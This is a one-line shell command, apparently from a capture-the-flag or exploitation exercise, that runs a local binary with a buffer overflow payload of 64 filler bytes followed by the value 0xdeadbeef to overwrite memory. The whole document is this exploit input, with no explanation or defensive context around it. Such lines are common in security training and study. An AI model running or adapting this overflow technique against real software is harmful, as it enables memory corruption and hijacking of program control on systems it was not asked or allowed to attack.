./bin $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\xef\xbe\xad\xde")')
